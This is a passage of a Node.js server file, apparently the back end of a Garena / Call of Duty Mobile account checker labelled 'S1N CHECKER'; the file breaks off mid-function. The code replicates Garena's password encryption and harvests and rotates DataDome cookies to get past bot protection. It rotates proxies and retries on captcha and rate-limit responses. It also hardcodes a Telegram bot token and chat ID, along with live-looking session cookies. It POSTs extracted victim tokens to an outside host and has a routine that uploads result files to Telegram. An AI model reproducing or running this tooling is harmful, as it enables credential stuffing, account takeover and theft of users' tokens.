// server.js
const os = require('os');
const sys = { // Partial sys emulation
    exit: (code) => {
        const message = `sys.exit(${code}) called. This indicates a critical issue that would halt a CLI. In API, throwing error.`;
        console.warn(message);
        // Throw a specific error type that can be caught by a global Express error handler
        const err = new Error(`EXIT_REQUESTED_CODE_${code}`);
        err.isSysExit = true;
        err.exitCode = code;
        throw err;
    },
    stdin: process.stdin, // Not used in API
    stdout: process.stdout, // For console logging
    stderr: process.stderr, // For console error logging
    version: process.version,
};
const re = { // RegExp helper, though direct JS RegExp is usually used
    compile: (pattern, flags) => new RegExp(pattern, flags),
    search: (pattern, text) => {
        const regex = (typeof pattern === 'string') ? new RegExp(pattern) : pattern;
        return regex.exec(text);
    },
    match: (pattern, text) => {
        const regex = (typeof pattern === 'string') ? new RegExp(pattern) : pattern;
        return regex.exec(text); // Similar to search for basic cases, use ^ for start
    },
    sub: (pattern, repl, text) => {
        const regex = (typeof pattern === 'string') ? new RegExp(pattern, 'g') : pattern; // Assuming global replace
        return text.replace(regex, repl);
    },
    escape: (str) => str.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'), // Basic regex escape
};
const time = {
    time: () => Math.floor(Date.now() / 1000),
    sleep: (seconds) => new Promise(resolve => setTimeout(resolve, seconds * 1000)),
};
const json = JSON; // Direct mapping
const hashlib = require('crypto-js'); // Using crypto-js for MD5
const random = {
    randint: (a, b) => Math.floor(Math.random() * (b - a + 1)) + a,
    choice: (arr) => arr[Math.floor(Math.random() * arr.length)],
    shuffle: (array) => { // Fisher-Yates shuffle
        for (let i = array.length - 1; i > 0; i--) {
            const j = Math.floor(Math.random() * (i + 1));
            [array[i], array[j]] = [array[j], array[i]];
        }
    }
};

// Logging - basic console logging to emulate Python's logging
const logging = {
    DEBUG: 10, INFO: 20, WARNING: 30, ERROR: 40, CRITICAL: 50,
    _level: 20, // Default to INFO
    _log_file_path: null,
    _fs: require('fs'), // Renamed to avoid conflict with global fs
    _path: require('path'), // Renamed to avoid conflict with global path

    basicConfig: ({ level, format, handlers, force }) => {
        if (level) logging._level = level;
        if (handlers) {
            for (const handler of handlers) {
                if (handler.constructor.name === 'FileHandler') {
                    logging._log_file_path = handler.filename;
                    try {
                        // Use logging._fs and logging._path
                        logging._fs.mkdirSync(logging._path.dirname(logging._log_file_path), { recursive: true });
                    } catch (e) { console.error("Error creating log directory:", e); }
                }
            }
        }
    },
    _log: (level, levelName, args, funcName = '', lineno = '', filename = '') => {
        if (level >= logging._level) {
            const message = args.map(arg => typeof arg === 'object' ? json.stringify(arg) : arg).join(' ');
            const timestamp = new Date().toISOString();
            const logMessage = `${timestamp} - ${levelName} - ${message}`;
            if (levelName === 'ERROR' || levelName === 'CRITICAL') {
                console.error(logMessage);
            } else if (levelName === 'WARNING') {
                console.warn(logMessage);
            } else {
                console.log(logMessage);
            }
            if (logging._log_file_path) {
                try {
                    // Use logging._fs
                    logging._fs.appendFileSync(logging._log_file_path, logMessage + '\n', 'utf-8');
                } catch (e) { console.error("Error writing to log file:", e); }
            }
        }
    },
    debug: (...args) => logging._log(logging.DEBUG, 'DEBUG', args),
    info: (...args) => logging._log(logging.INFO, 'INFO', args),
    warning: (...args) => logging._log(logging.WARNING, 'WARNING', args),
    error: (...args) => logging._log(logging.ERROR, 'ERROR', args),
    critical: (...args) => logging._log(logging.CRITICAL, 'CRITICAL', args),
    exception: (...args) => {
        const err = args[args.length -1];
        if (err instanceof Error && err.stack) {
            logging._log(logging.ERROR, 'ERROR', [args.slice(0,-1).join(" "), err.stack]);
        } else {
            logging._log(logging.ERROR, 'ERROR', args);
        }
    },
    getLevelName: (level) => {
        for (const name in logging) {
            if (logging[name] === level && typeof logging[name] === 'number') return name;
        }
        return String(level);
    },
    getLogger: () => ({ level: logging._level })
};

class FileHandler {
    constructor(filename, encoding) {
        this.filename = filename;
        this.encoding = encoding;
    }
}
logging.FileHandler = FileHandler;


const urllib = { // Partial urllib emulation
    parse: require('url'),
    request: require('axios'),
};
urllib.parse.quote = encodeURIComponent;
urllib.parse.unquote = decodeURIComponent;
urllib.parse.urlencode = (params) => new URLSearchParams(params).toString();
urllib.parse.urlparse = urllib.parse.parse;
urllib.parse.parse_qs = (qs) => Object.fromEntries(new URLSearchParams(qs));


const platform = {
    system: () => os.platform(),
    release: () => os.release(),
};
const axios = require('axios');
const he = require('he'); // For HTML escaping/unescaping
const FormData = require('form-data'); // Kept for send_files_to_telegram
const fs = require('fs');
const fsExtra = require('fs-extra');
const path = require('path');
const crypto = require('crypto'); // Node.js built-in crypto for AES

const { CookieJar } = require('tough-cookie');
const { wrapper: axiosCookieJarSupport } = require('axios-cookiejar-support');
axiosCookieJarSupport(axios);


// colorama constants
const Fore = {
    RED: '\x1b[31m', GREEN: '\x1b[32m', YELLOW: '\x1b[33m', BLUE: '\x1b[34m',
    MAGENTA: '\x1b[35m', CYAN: '\x1b[36m', WHITE: '\x1b[37m', LIGHTBLACK_EX: '\x1b[90m',
};
const Style = {
    BRIGHT: '\x1b[1m', RESET_ALL: '\x1b[0m', DIM: '\x1b[2m',
};
const Back = {
    RED: '\x1b[41m',
};
const init = ({ autoreset }) => { /* In Node, direct ANSI codes usually work. */ };
init({ autoreset: true });

const COLORS = {
    "RED": Fore.RED, "GREEN": Fore.GREEN, "YELLOW": Fore.YELLOW, "BLUE": Fore.BLUE,
    "MAGENTA": Fore.MAGENTA, "CYAN": Fore.CYAN, "WHITE": Fore.WHITE, "GREY": Fore.LIGHTBLACK_EX,
    "BOLD": Style.BRIGHT, "RESET": Style.RESET_ALL, "HIGHLIGHT": "\x1b[7m",
    "RED_BG": Style.BRIGHT + Fore.WHITE + Back.RED,
    "BLUE_BOLD": Fore.BLUE + Style.BRIGHT,
};


const { DateTime, Settings } = require('luxon');
Settings.defaultZone = 'utc';

try {
    if (!crypto) throw new Error("Crypto module not available");
} catch (e) {
    console.error("ERROR: CRYPTO MODULE NOT FOUND. THIS IS UNEXPECTED IN NODE.JS");
    sys.exit(1); // This will now throw an error
}

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "7671609285:AAFYtH0qVuRWWoJTI8gcCriFEAVu11eMayo"; // Use environment variables
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || "6542321044";       // Or keep placeholders if bot func is external

const DATADOME_JSON_FILE = ".datadome.json";
const MAX_DATADOMES_IN_JSON = 20;

const NEW_COOKIES_JSON_FILE = ".newCookies.json";
const MAX_COOKIE_SETS_IN_JSON = 20;

const MAX_DATADOME_RETRIES_FOR_ACCOUNT = 3; // Kept for check_account logic
const PROXY_RETRY_LIMIT = 3; // Kept for check_account logic
const REQUEST_TIMEOUT = 30;

const RETRYABLE_PROXY_ERROR_PREFIXES = [ // Kept for check_account logic
    "[🤖] CAPTCHA", "[⏱️]", "[🔴] CONNECTION ERROR", "[🔌]",
    "[📉] HTTP ERROR 50", "[📉] LOGIN HTTP ERROR 50",
    "[🚫] LOGIN FORBIDDEN (403)", "[🚫] PRELOGIN FORBIDDEN (403)",
    "[🚦] RATE LIMITED (429)", "[🚦] PRELOGIN RATE LIMITED (429)",
];
const GARENA_COUNTRY_MAP = {
    "ID": "INDONESIA", "SG": "SINGAPORE", "MY": "MALAYSIA",
    "PH": "PHILIPPINES", "TH": "THAILAND", "VN": "VIETNAM",
    "TW": "TAIWAN", "INDIA": "INDIA", "IND": "INDIA",
    "INDONESIA": "INDONESIA", "SINGAPORE": "SINGAPORE", "MALAYSIA": "MALAYSIA",
    "PHILIPPINES": "PHILIPPINES", "THAILAND": "THAILAND", "VIETNAM": "VIETNAM",
    "TAIWAN": "TAIWAN",
    "US": "UNITED STATES", "UNITED STATES": "UNITED STATES",
    "BR": "BRAZIL", "BRAZIL": "BRAZIL",
};

const APK_URL = "https://auth.garena.com/api/login?";
const REDIRECT_URL = "https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/";

class _HardcodedCookies {
    static get_cookies() {
        return {
            "_ga_57E30E1PMN": "GS1.2.1729857978.1.0.1729857978.0.0.0",
            "_ga": "GA1.1.807684783.1745020674",
            "apple_state_key": "cfa019380fba11f0ab6b3649d295da0e",
            "token_session": "d704c5dfc26be8c2d15502ca773af4ee4c468da1bf1e02e0517c251a7eb85c4ce019822b4258af36dfe926514ae804d6",
            "_ga_G8QGMJPWWV": "GS1.1.1729344366.1.0.1729344366.0.0.0",
            "datadome": "wqUi~PPzbPlTwUviBVpxtqvK46IddzBTRCx5q2nRRQlSjdsOsplC2YgTRU4Heg2AciGFbFhjLuFvnzmiNOeKF41KQf~z4fgshTAev~yj7gDcQBRuMYG3JgnM~aXmWtEu",
            "_ga_1M7M9L6VPX": "GS1.1.1745291516.2.0.1745291516.0.0.0",
            "_ga_XB5PSHEQB4": "GS2.1.s1746261685$o4$g1$t1746261797$j0$l0$h0",
            "ac_session": "q8ye3vysanmr98or00x107x5tr4sfi2g",
            "sso_key": "9c926ab310aa771aa1a6a86e107ca89e3da4535cfca38d5d64f527f2a7cfb581",
        };
    }
}

function load_cookie_sets_from_storage() {
    if (!fs.existsSync(NEW_COOKIES_JSON_FILE)) {
        return [];
    }
    try {
        const fileContent = fs.readFileSync(NEW_COOKIES_JSON_FILE, 'utf-8');
        const data = json.parse(fileContent);
        if (Array.isArray(data)) {
            return data.filter(item => typeof item === 'object' && item !== null && Object.keys(item).length > 0);
        }
        logging.warning(`${NEW_COOKIES_JSON_FILE} does not contain a list of cookie sets.`);
        return [];
    } catch (e) {
        logging.error(`Error loading cookie sets from ${NEW_COOKIES_JSON_FILE}: ${e.message}`);
        return [];
    }
}

function save_cookie_set_to_storage(new_cookie_set) {
    if (typeof new_cookie_set !== 'object' || new_cookie_set === null || Object.keys(new_cookie_set).length === 0) {
        return;
    }
    let cookie_sets = load_cookie_sets_from_storage();
    const isNewSetPresent = cookie_sets.some(cs => JSON.stringify(cs) === JSON.stringify(new_cookie_set));

    if (!isNewSetPresent) {
        cookie_sets.push(new_cookie_set);
        while (cookie_sets.length > MAX_COOKIE_SETS_IN_JSON) {
            cookie_sets.shift();
        }
        try {
            fs.writeFileSync(NEW_COOKIES_JSON_FILE, json.stringify(cookie_sets, null, 2), 'utf-8');
            logging.info(`Saved/Updated cookie set to ${NEW_COOKIES_JSON_FILE}`);
        } catch (e) {
            logging.error(`Error writing cookie sets to ${NEW_COOKIES_JSON_FILE}: ${e.message}`);
        }
    }
}

function starting_cookies() {
    let cookies_to_use = null;
    let source_message = "";

    const given_cookies = _HardcodedCookies.get_cookies();
    if (typeof given_cookies === 'object' && given_cookies !== null && Object.keys(given_cookies).length > 0) {
        save_cookie_set_to_storage(given_cookies);
    } else {
        logging.error("'Given' cookies (from _HardcodedCookies) are invalid. This is unexpected.");
    }

    try {
        // Assuming change_cookie.js is in the same directory if it exists
        const changeCookiePath = path.join(__dirname, 'change_cookie.js');
        if (fs.existsSync(changeCookiePath)) {
            const change_cookie = require(changeCookiePath);
            if (change_cookie && typeof change_cookie.get_cookies === 'function') {
                const session_cookies = change_cookie.get_cookies();
                if (typeof session_cookies === 'object' && session_cookies !== null && Object.keys(session_cookies).length > 0) {
                    cookies_to_use = session_cookies;
                    source_message = "Using cookies from 'change_cookie.js' module for this session.";
                    logging.info(source_message);
                    save_cookie_set_to_storage(cookies_to_use);
                } else {
                    logging.warning("'change_cookie.get_cookies()' returned empty or invalid data.");
                }
            } else {
                logging.warning("'change_cookie.js' found, but 'get_cookies' is missing or not callable.");
            }
        } else {
             logging.info("'change_cookie.js' MODULE NOT FOUND. This is optional.");
        }
    } catch (e) {
        if (e.code === 'MODULE_NOT_FOUND' && e.message.includes('change_cookie.js')) {
            logging.info("Optional 'change_cookie.js' module not found. Proceeding without it.");
        } else {
            logging.error(`Error loading cookies from 'change_cookie.js': ${e.message}.`);
        }
    }

    if (!cookies_to_use) {
        const stored_cookie_sets = load_cookie_sets_from_storage();
        if (stored_cookie_sets.length > 0) {
            cookies_to_use = random.choice(stored_cookie_sets);
            source_message = `Using a stored cookie set from '${NEW_COOKIES_JSON_FILE}' for this session.`;
            logging.info(source_message);
        } else {
            logging.warning(`No valid cookie sets found in '${NEW_COOKIES_JSON_FILE}'.`);
        }
    }

    if (!cookies_to_use) {
        if (typeof given_cookies === 'object' && given_cookies !== null && Object.keys(given_cookies).length > 0) {
            cookies_to_use = given_cookies;
            source_message = "Using 'given' (hardcoded/snippet) cookies for this session as other sources failed.";
            logging.info(source_message);
        } else {
            logging.error("All cookie sources failed, including 'given' cookies. Using empty cookies for session.");
            cookies_to_use = {};
            source_message = "All cookie sources failed. Using empty cookies for session.";
        }
    }
    
    if (typeof cookies_to_use !== 'object' || cookies_to_use === null) { 
        logging.critical(`Cookie acquisition critically resulted in non-object type: ${typeof cookies_to_use}. Using empty dict.`);
        cookies_to_use = {};
        source_message += " (CRITICAL: Fell back to empty dict due to unexpected error)";
    }

    logging.info(`Final cookie source decision for this session: ${source_message}`);
    return [cookies_to_use, source_message];
}

function strip_ansi_codes(text) {
    if (typeof text !== 'string') return text;
    const ansi_escape = /\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])/g;
    return text.replace(ansi_escape, '');
}

function get_current_timestamp() {
    return String(Math.floor(Date.now() / 1000));
}

function generate_md5_hash(password) {
    return hashlib.MD5(password).toString(hashlib.enc.Hex);
}

function generate_decryption_key(password_md5, v1, v2) {
    const intermediate_hash = hashlib.SHA256(password_md5 + v1).toString(hashlib.enc.Hex);
    return hashlib.SHA256(intermediate_hash + v2).toString(hashlib.enc.Hex);
}

function encrypt_aes_256_ecb(plaintext, key) {
    try {
        const keyBuffer = Buffer.from(key, 'hex');
        if (keyBuffer.length !== 32) {
            throw new Error(`AES KEY MUST BE 32 BYTES (256 BITS), GOT ${keyBuffer.length}`);
        }
        const plaintextBuffer = Buffer.from(plaintext, 'hex');
        const blockSize = 16;
        const paddingLength = blockSize - (plaintextBuffer.length % blockSize);
        const paddingBuffer = Buffer.alloc(paddingLength, paddingLength);
        const paddedPlaintext = Buffer.concat([plaintextBuffer, paddingBuffer]);
        const cipher = crypto.createCipheriv('aes-256-ecb', keyBuffer, null);
        cipher.setAutoPadding(false);
        let encrypted = cipher.update(paddedPlaintext, null, 'hex');
        encrypted += cipher.final('hex');
        return encrypted.substring(0, 32);
    } catch (e) {
         logging.error(`AES ENCRYPTION ERROR: ${e.message}. PLAINTEXT: ${plaintext.substring(0,10)}..., KEY: ${key.substring(0,10)}...`);
         throw e;
    }
}

function get_encrypted_password(password, v1, v2) {
    const password_md5 = generate_md5_hash(password);
    const decryption_key = generate_decryption_key(password_md5, v1, v2);
    return encrypt_aes_256_ecb(password_md5, decryption_key);
}

function get_request_data(initial_cookies_tuple) {
    let [cookies] = initial_cookies_tuple;
    if (typeof cookies !== 'object' || cookies === null) {
        logging.warning("get_request_data received non-object cookies. Using empty object as fallback.");
        cookies = {};
    }
    const user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36';
    const headers = {
        'Host': 'auth.garena.com', 'Connection': 'keep-alive',
        'sec-ch-ua': '"Google Chrome";v="129", "Not)A;Brand";v="8", "Chromium";v="129"',
        'sec-ch-ua-mobile': '?0', 'User-Agent': user_agent, 'sec-ch-ua-platform': '"Windows"',
        'Accept': 'application/json, text/plain, */*', 'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://auth.garena.com/universal/oauth?all_platforms=1&response_type=token&locale=en-SG&client_id=100082&redirect_uri=' + urllib.parse.quote(REDIRECT_URL),
        'Accept-Encoding': 'gzip, deflate, br, zstd', 'Accept-Language': 'en-US,en;q=0.9'
    };
    return [cookies, headers];
}

function detect_captcha_in_response(response_text) {
    return typeof response_text === 'string' && response_text.toLowerCase().includes("captcha");
}

async function get_public_ip(proxies = null, timeout = REQUEST_TIMEOUT) {
    const axiosConfig = { timeout: timeout * 1000 };
    if (proxies) {
        const proxyConfig = buildAxiosProxyConfig(proxies);
        if (proxyConfig) axiosConfig.proxy = proxyConfig;
    }
    try {
        const response = await axios.get('https://api.ipify.org?format=json', axiosConfig);
        if (response.status !== 200) throw new Error(`HTTP error ${response.status}`);
        return response.data.ip || 'IP FETCH FAILED';
    } catch (e) {
        logging.warning(`COULD NOT FETCH PUBLIC IP: ${e.message}`);
        return `IP FETCH ERROR (${e.constructor.name})`;
    }
}

function load_datadomes_from_storage() {
    if (!fs.existsSync(DATADOME_JSON_FILE)) {
        return [];
    }
    try {
        const fileContent = fs.readFileSync(DATADOME_JSON_FILE, 'utf-8');
        const data = json.parse(fileContent);
        if (Array.isArray(data)) {
            return data.filter(item => typeof item === 'string' && item.trim().length > 0);
        }
        logging.warning(`${DATADOME_JSON_FILE} DOES NOT CONTAIN A LIST.`);
        return [];
    } catch (e) {
        logging.error(`ERROR LOADING DATADOMES FROM ${DATADOME_JSON_FILE}: ${e.message}`);
        return [];
    }
}

function save_datadome_to_storage(new_datadome) {
    if (typeof new_datadome !== 'string' || !new_datadome.trim()) {
        return;
    }
    if (new_datadome.startsWith("[🤖]") || new_datadome.startsWith("[⚠️]")) {
        logging.warning(`ATTEMPTED TO SAVE AN ERROR/CAPTCHA STRING AS DATADOME: ${new_datadome}`);
        return;
    }
    let datadomes = load_datadomes_from_storage();
    if (!datadomes.includes(new_datadome)) {
        datadomes.push(new_datadome);
        while (datadomes.length > MAX_DATADOMES_IN_JSON) {
            datadomes.shift();
        }
        try {
            fs.writeFileSync(DATADOME_JSON_FILE, json.stringify(datadomes, null, 2), 'utf-8');
            logging.info(`SAVED/UPDATED DATADOME: ${new_datadome.substring(0,30)}... TO ${DATADOME_JSON_FILE}`);
        } catch (e) {
            logging.error(`ERROR WRITING DATADOMES TO ${DATADOME_JSON_FILE}: ${e.message}`);
        }
    }
}

async function send_files_to_telegram(file_paths, bot_token, chat_id, base_caption = "S1N CHECKER RESULTS") {
    // This function is kept as a utility, but not called by the main /api/check flow
    if (!bot_token || !chat_id || bot_token.includes("YOUR_") || chat_id.includes("YOUR_")) {
        logging.warning("TELEGRAM BOT TOKEN OR CHAT ID IS NOT CONFIGURED OR USING PLACEHOLDERS. SKIPPING FILE SENDING.");
        return;
    }
    // ... (rest of the function is unchanged) ...
    if (!file_paths || file_paths.length === 0) {
        logging.info("NO FILES PROVIDED TO SEND TO TELEGRAM.");
        return;
    }

    logging.info(`ATTEMPTING TO SEND ${file_paths.length} FILES TO TELEGRAM CHAT ID ${chat_id}`);
    let success_count = 0;
    let fail_count = 0;
    const api_url = `https://api.telegram.org/bot${bot_token}/sendDocument`;

    for (const file_path_item of file_paths) {
        if (!fs.existsSync(file_path_item)) {
            logging.warning(`FILE NOT FOUND, CANNOT SEND TO TELEGRAM: ${file_path_item}`);
            fail_count += 1;
            continue;
        }
        
        // A minimal check for "empty" files, adjust as needed for API context (if it ever gets used)
        const min_size = 20; // Smallest reasonable file size
        try {
            if (fs.statSync(file_path_item).size <= min_size) {
                logging.info(`SKIPPING EMPTY OR VERY SMALL FILE FOR TELEGRAM: ${path.basename(file_path_item)}`);
                continue;
            }
        } catch (e) {
            logging.error(`COULD NOT GET SIZE OF FILE ${file_path_item}: ${e.message}`);
            fail_count += 1;
            continue;
        }

        const file_name = path.basename(file_path_item);
        const caption_text = `${base_caption.toUpperCase()}: ${file_name}`.substring(0, 1024);

        const form = new FormData();
        form.append('chat_id', chat_id);
        form.append('caption', caption_text);
        form.append('document', fs.createReadStream(file_path_item), file_name);
        
        try {
            const response = await axios.post(api_url, form, {
                headers: form.getHeaders(),
                timeout: 60000
            });
            
            if (response.data.ok) {
                logging.info(`SUCCESSFULLY SENT ${file_name} TO TELEGRAM.`);
                success_count += 1;
            } else {
                const error_desc = response.data.description || 'UNKNOWN TELEGRAM API ERROR';
                logging.error(`FAILED TO SEND ${file_name} TO TELEGRAM: ${error_desc}`);
                fail_count += 1;
            }
        } catch (e) {
            if (e.code === 'ETIMEDOUT' || (e.response && e.response.status === 408) ) {
                 logging.error(`TIMEOUT SENDING ${file_name} TO TELEGRAM.`);
            } else if (e.isAxiosError) {
                 logging.error(`NETWORK/REQUEST ERROR SENDING ${file_name} TO TELEGRAM: ${strip_ansi_codes(e.message)}`);
                 if(e.response && e.response.data) logging.error(`Telegram Response: ${json.stringify(e.response.data)}`);
            } else {
                 logging.exception(`UNEXPECTED ERROR SENDING ${file_name} TO TELEGRAM.`);
            }
            fail_count += 1;
        } finally {
            await time.sleep(0.5);
        }
    }

    if (success_count > 0 || fail_count > 0) {
        // console.log might not be appropriate if this is called by a bot backend
        logging.info(`TELEGRAM SEND SUMMARY: ${success_count} SUCCEEDED, ${fail_count} FAILED.`);
        if (fail_count > 0) {
             logging.warning(`CHECK LOGS FOR DETAILS ON FAILED TELEGRAM SENDS.`);
        }
    }
}

function buildAxiosProxyConfig(proxies) {
    if (!proxies || (!proxies.http && !proxies.https)) return null;
    const proxyUrlString = proxies.http || proxies.https;
    try {
        const proxyUrl = new URL(proxyUrlString);
        const config = {
            host: proxyUrl.hostname,
            port: parseInt(proxyUrl.port),
            protocol: proxyUrl.protocol.slice(0, -1),
        };
        if (proxyUrl.username || proxyUrl.password) {
            config.auth = {
                username: decodeURIComponent(proxyUrl.username),
                password: decodeURIComponent(proxyUrl.password),
            };
        }
        return config;
    } catch (e) {
        logging.error(`Invalid proxy URL format: ${proxyUrlString} - ${e.message}`);
        return null;
    }
}

async function get_datadome_cookie(proxies = null, timeout = REQUEST_TIMEOUT) {
    const url = 'https://dd.garena.com/js/';
    const headers = {
        'accept': '*/*', 'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'en-US,en;q=0.9', 'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://account.garena.com', 'pragma': 'no-cache',
        'referer': 'https://account.garena.com/',
        'sec-ch-ua': '"Google Chrome";v="129", "Not)A;Brand";v="8", "Chromium";v="129"',
        'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'
    };
    const payload = {
        'jsData': json.stringify({"ttst": random.randint(50, 150), "br_oh":1080, "br_ow":1920}),
        'eventCounters': '[]', 'jsType': 'ch', 'ddv': '4.35.4',
        'Referer': 'https://account.garena.com/', 'request': '%2F', 'responsePage': 'origin',
    };
    const data = Object.entries(payload).map(([k, v]) => `${k}=${urllib.parse.quote(String(v))}`).join('&');

    const axiosConfig = {
        headers: headers,
        timeout: timeout * 1000,
        proxy: buildAxiosProxyConfig(proxies),
    };
    
    try {
        const response = await axios.post(url, data, axiosConfig);
        const response_text = strip_ansi_codes(String(response.data));

        if (detect_captcha_in_response(typeof response.data === 'string' ? response.data : json.stringify(response.data))) {
            logging.warning(`CAPTCHA DETECTED IN DATADOME RESPONSE BODY: ${String(response.data).substring(0,200)}`);
            return "[🤖] CAPTCHA DETECTED (DATADOME RESPONSE BODY)";
        }
        if (response.status < 200 || response.status >= 300) { 
             throw new Error(`HTTP error ${response.status}`);
        }
        const response_json = typeof response.data === 'object' ? response.data : json.parse(response.data);
        if (detect_captcha_in_response(json.stringify(response_json))) {
             logging.warning(`CAPTCHA DETECTED IN DATADOME JSON RESPONSE: ${json.stringify(response_json)}`);
             return "[🤖] CAPTCHA DETECTED (DATADOME JSON)";
        }
        if (response_json.cookie) {
            const cookie_string = response_json.cookie;
            const match = /datadome=([^;]+)/.exec(cookie_string);
            if (match) {
                const datadome_value = match[1];
                save_datadome_to_storage(datadome_value);
                return datadome_value;
            }
        }
        logging.warning(`DATADOME RESPONSE MISSING EXPECTED COOKIE: ${json.stringify(response_json)}`);
        return null;
    } catch (e) {
        const error_str = strip_ansi_codes(e.message);
        const resp_text_snippet = strip_ansi_codes(e.response && e.response.data ? String(e.response.data).substring(0,100) : "");

        if (detect_captcha_in_response(error_str) || detect_captcha_in_response(resp_text_snippet)) {
             logging.warning(`CAPTCHA DETECTED DURING DATADOME REQUEST/PARSE ERROR: ${error_str} / ${resp_text_snippet}`);
             return "[🤖] CAPTCHA DETECTED (DATADOME REQUEST/PARSE ERROR)";
        }
        if (e.code === 'ECONNABORTED' || e.message.toLowerCase().includes('timeout')) { 
            logging.error(`TIMEOUT GETTING DATADOME COOKIE: ${error_str}`);
            return "[⏱️] DATADOME TIMEOUT";
        }
        if (e.isAxiosError && !e.response) { 
            logging.error(`CONNECTION ERROR GETTING DATADOME COOKIE: ${error_str}`);
            return "[🔴] DATADOME CONNECTION ERROR";
        }
        logging.error(`FAILED TO GET DATADOME COOKIE: ${error_str}`);
        return `[⚠️] DATADOME ERROR: ${error_str.substring(0,100)}`;
    }
}

function parseSetCookies(setCookieHeader) {
    if (!setCookieHeader) return {};
    const cookies = {};
    const setCookieParser = require('set-cookie-parser');
    const parsed = setCookieParser.parse(setCookieHeader);
    parsed.forEach(cookie => {
        cookies[cookie.name] = cookie.value;
    });
    return cookies;
}

async function show_level(access_token, selected_header, cookies_for_codm, proxies = null, timeout = REQUEST_TIMEOUT) {
    const callback_base_url = "https://auth.codm.garena.com/auth/auth/callback_n";
    const callback_params = {"site": "https://api-delete-request.codm.garena.co.id/oauth/callback/", "access_token": access_token};
    let headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml",
        "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "en-US,en;q=0.9",
        "Referer": "https://auth.garena.com/", "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-site",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": selected_header["User-Agent"] || "Mozilla/5.0",
    };
    for (const key in selected_header) {
        if (key.toLowerCase().startsWith('sec-ch-ua')) {
            headers[key] = selected_header[key];
        }
    }

    let current_cookies = { ...cookies_for_codm };
    let extracted_token = null;

    try {
        let current_url = callback_base_url;
        let current_params_obj = { ...callback_params };
        let redirect_count = 0;
        const max_redirects = 7;

        while (redirect_count < max_redirects) {
            const cookieString = Object.entries(current_cookies).map(([k, v]) => `${k}=${v}`).join('; ');
            const axiosConfig = {
                headers: {...headers, 'Cookie': cookieString },
                params: current_params_obj,
                maxRedirects: 0,
                proxy: buildAxiosProxyConfig(proxies),
                timeout: timeout * 1000,
                validateStatus: (status) => status >= 200 && status < 400 || [301, 302, 307, 308].includes(status),
            };

            const response = await axios.get(current_url, axiosConfig);
            const response_text_clean = strip_ansi_codes(String(response.data));
            const newCookiesFromResponse = parseSetCookies(response.headers['set-cookie']);
            current_cookies = { ...current_cookies, ...newCookiesFromResponse };

            if (detect_captcha_in_response(response_text_clean)) {
                logging.warning(`CAPTCHA DETECTED IN CODM CALLBACK BODY (URL: ${current_url.substring(0,100)}...)`);
                return "[🤖] CAPTCHA DETECTED (CODM CALLBACK/REDIRECT BODY)";
            }
            if (response.status >= 400 && detect_captcha_in_response(response_text_clean)) {
                logging.warning(`CAPTCHA DETECTED IN CODM CALLBACK HTTP ERROR ${response.status} BODY`);
                return "[🤖] CAPTCHA DETECTED (CODM CALLBACK/REDIRECT HTTP ERROR)";
            }

            if ([301, 302, 307, 308].includes(response.status)) {
                const redirect_url = response.headers['location'];
                if (!redirect_url) {
                    logging.error("CODM REDIRECT DETECTED BUT NO LOCATION HEADER.");
                    return "[CODM FAIL] REDIRECT DETECTED BUT NO LOCATION HEADER.";
                }
                const parsedCurrentUrl = new URL(current_url);
                current_url = new URL(redirect_url, parsedCurrentUrl.origin + parsedCurrentUrl.pathname).toString();
                current_params_obj = null;
                redirect_count += 1;
                await time.sleep(0.2);
            } else {
                if (response.status < 200 || response.status >= 300) {
                     throw new Error(`HTTP error ${response.status}`);
                }
                const final_url = response.request.res.responseUrl || current_url;
                const parsed_final_url = new URL(final_url);
                const query_params = Object.fromEntries(parsed_final_url.searchParams);
                extracted_token = query_params.token || null;

                if (!extracted_token) {
                     const match = /["']token["']\s*:\s*["']([\w\-.]+)["']/.exec(response_text_clean);
                     if (match) extracted_token = match[1];
                }
                if (!extracted_token) {
                     logging.warning(`CODM TOKEN EXTRACTION FAILED. FINAL URL: ${final_url}, STATUS: ${response.status}, BODY SNIPPET: ${response_text_clean.substring(0,200)}`);
                     return "[CODM FAIL] COULD NOT EXTRACT CODM TOKEN FROM CALLBACK.";
                }
                break;
            }
        }
        if (redirect_count >= max_redirects) {
            logging.error("MAXIMUM REDIRECTS REACHED DURING CODM CALLBACK.");
            return "[CODM FAIL] MAXIMUM REDIRECTS REACHED DURING CODM CALLBACK.";
        }
        
        const external_codm_script = "https://suneoxjarell.x10.bz/jajac.php";
        const payload_for_script = {
            "user_agent": selected_header["User-Agent"],
            "extracted_token": extracted_token
        };
        const script_headers = {"Content-Type": "application/json", "User-Agent": selected_header["User-Agent"]};

        try {
            const response_codm = await axios.post(external_codm_script, payload_for_script, {
                headers: script_headers,
                proxy: buildAxiosProxyConfig(proxies),
                timeout: timeout * 1000
            });
            const response_codm_text_clean = strip_ansi_codes(String(response_codm.data).trim());

            if (detect_captcha_in_response(response_codm_text_clean)) {
                 logging.warning("CAPTCHA DETECTED IN EXTERNAL CODM SCRIPT RESPONSE.");
                 return "[🤖] CAPTCHA DETECTED (CODM EXTERNAL SCRIPT RESPONSE)";
            }
            if (response_codm.status < 200 || response_codm.status >= 300) {
                throw new Error(`HTTP error ${response_codm.status}`);
            }
            if (response_codm_text_clean.includes("|") && response_codm_text_clean.split("|").length === 4) {
